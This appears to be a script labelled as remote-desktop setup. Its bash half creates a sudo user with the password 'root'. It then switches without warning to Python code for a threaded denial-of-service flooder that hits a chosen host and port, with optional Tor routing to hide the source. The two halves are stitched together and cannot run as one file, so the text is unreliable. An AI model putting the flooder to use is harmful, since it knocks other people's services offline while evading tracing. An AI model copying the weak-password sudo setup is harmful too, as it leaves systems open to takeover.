#! /bin/bash

# Make Instance Ready for Remote Desktop or RDP

b='\033[1m'
r='\E[31m'
g='\E[32m'
c='\E[36m'
endc='\E[0m'
enda='\033[0m'

clear

# Branding

printf """$c$b
██████╗░██████╗░░█████╗░░██████╗  ██████╗░░█████╗░░██████╗░░█████╗░██╗░░░░░
██╔══██╗██╔══██╗██╔══██╗██╔════╝  ██╔══██╗██╔══██╗██╔════╝░██╔══██╗██║░░░░░
██║░░██║██║░░██║██║░░██║╚█████╗░  ██████╦╝███████║██║░░██╗░██║░░██║██║░░░░░
██║░░██║██║░░██║██║░░██║░╚═══██╗  ██╔══██╗██╔══██║██║░░╚██╗██║░░██║██║░░░░░
██████╔╝██████╔╝╚█████╔╝██████╔╝  ██████╦╝██║░░██║╚██████╔╝╚█████╔╝███████╗
╚═════╝░╚═════╝░░╚════╝░╚═════╝░  ╚═════╝░╚═╝░░╚═╝░╚═════╝░░╚════╝░╚══════╝
░█████╗░██╗░░░██╗██████╗░███████╗██████╗░
██╔══██╗╚██╗░██╔╝██╔══██╗██╔════╝██╔══██╗
██║░░╚═╝░╚████╔╝░██████╦╝█████╗░░██████╔╝
██║░░██╗░░╚██╔╝░░██╔══██╗██╔══╝░░██╔══██╗
╚█████╔╝░░░██║░░░██████╦╝███████╗██║░░██║
░╚════╝░░░░╚═╝░░░╚═════╝░╚══════╝╚═╝░░╚═╝
    $r BAGOL $c 
$endc$enda""";


# Used Two if else type statements, one is simple second is complex. So, don't get confused or fear by seeing complex if else statement '^^.

# Creation of user
printf "\n\nCreating user " >&2
if sudo useradd -m user &> /dev/null
then
  printf "\ruser created $endc$enda\n" >&2
else
  printf "\r$r$b Error Occured $endc$enda\n" >&2
  exit
fi
# Add user to sudo group
sudo adduser user sudo

# Set password of user to 'root'
echo 'user:root' | sudo chpasswd

# Change default shell from sh to bash
sed -i 's/\/bin\/sh/\/bin\/bash/g' /etc/passwd

# Initialisation of Installer
printf "\n\n$c$b    Loading Installer $endc$enda" >&2
if sudo apt-get update &> /dev/null
then
    printf "\r$g$b    Installer Loaded $endc$enda\n" >&2
else
    printf "\r$r$b    Error Occured $endc$enda\n" >&2
    exit
fi

class DoS:
    def __init__(self, host, port, nThreads, useTor):
        # Target Info
        self.host = host
        self.port = port
        # Num of Attacks
        self.nThreads = nThreads
        self.threads = []
        # Tor
        self.useTor = useTor
        self.TPS = 0
        self.Delimiter = 2000
        # Message
        self.message = "GET /" + self.host + " HTTP/1.1\r\n"

        if self.useTor:
            socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)

    def Zombie(self):
        if self.useTor:
            s = socks.socksocket()
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            s.connect((self.host, self.port))
            s.send(self.message.encode("ascii"))  # TCP Attack
            s.sendto(self.message.encode("ascii"),
                     (self.host, self.port))  # UDP Attack
        except socket.error as err:
            print("[-] Error Message: " + err)
            pass
        except KeyboardInterrupt:
            print("[-] Canceled By User")
            exit("[-] Canceled By User")

        s.close()

    def Attack(self):
        with concurrent.futures.ThreadPoolExecutor() as executer:
            executer.map(self.Zombie, range(self.nThreads))


if __name__ == "__main__":
    print("\n==============================")
    print("       Ping Target")
    print("==============================")
    Tor = input('[?] Did you want to use Tor (Y/N): ').lower()
    host = input("[*] Enter Target Host Address: ")
    port = int(input("[*] Enter Target Port to Attack: "))
    threads = int(input("[*] Enter number of Attacks: "))

    hostip = socket.gethostbyname(host)
    useTor = True if Tor == 'y' else False

    DoS = DoS(host, port, threads, useTor)

    print("\n==============================")
    print("       Target Info")
    print("==============================")
    print("Host {} && IP {}".format(host, hostip))

    print("\n==============================")
    print("       Launching Attack")
    print("==============================")
    print("[#] Starting The Attack At {} ...".format(time.strftime("%H:%M:%S")))
    start_time = datetime.now()

    DoS.Attack()

    end_time = datetime.now()
    total_time = end_time - start_time

    print("[#] The Attack Was Done At {} ...".format(time.strftime("%H:%M:%S")))
    print("[#] Total Attack Time {}".format(total_time))
